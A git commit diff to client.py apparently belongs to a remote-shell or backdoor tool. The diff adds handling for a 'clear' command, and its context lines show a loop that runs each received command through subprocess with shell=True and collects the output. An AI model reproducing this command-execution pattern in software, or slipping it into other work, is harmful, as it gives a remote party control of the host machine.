1525424a661c83ecb4f83c49a6cc631fa3f40e90
bloodimooni <joshua@infiniment.de>
2022-10-28 21:09:46 +0200

    client change

--- client.py
+++ client.py
@@ -21,6 +21,10 @@ def shell():
 
         elif command[:3] == "cd ":
             os.chdir(command[3:])
+
+        elif command == "clear":
+            pass
+
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
